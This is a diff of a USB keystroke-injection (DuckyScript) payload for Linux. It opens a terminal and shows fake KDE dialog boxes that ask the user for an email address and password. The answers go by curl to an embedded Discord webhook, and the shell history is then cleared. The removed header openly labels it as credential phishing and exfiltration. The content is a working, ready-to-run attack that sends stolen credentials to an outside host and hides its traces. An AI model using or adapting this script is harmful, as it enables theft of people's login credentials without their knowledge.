@@ -1,30 +1,10 @@
-
-REM ###########################################################
-REM #                                                         |
-REM # Title        : Exfiltrate Email And Password By Phising |
-REM # Author       : Zenin                                    |
-REM # Version      : 1.0                                      |
-REM # Category     : Credentials, Phishing                    |
-REM # Target       : Linux                                    |
-REM #                                                         |
-REM ###########################################################
-
-REM Requirements:
-REM     - Internet Connection
-REM     - Discord webhook
-
 DELAY 1000
 CTRL-ALT t
 DELAY 2000
-
-
-REM #### POPUP SECTION ####
-
 
 STRING WEBHOOK_URL="https://discord.com/api/webhooks/1164596165849927792/7ASILUXC1ya92O9OsNFDXhVS_MBFOkTZWlBLVaTtzVwXeO8jz1_IGi5w82goz88vProJ"
 ENTER
 DELAY 500
 
-REM All-in-one is important
 STRING $(curl -H "Content-Type: application/json" -X POST -d "{\"content\": \"$(echo $(kdialog --sorry 'Email incorrect.\n Will not connect to server, please retry.'; kdialog --title 'Email \n Put your email address to connect yout account.' --inputbox 'Email:'; kdialog --title 'Email Login' --password 'Email Password:';))\"}" $WEBHOOK_URL); history -c; exit;
 ENTER
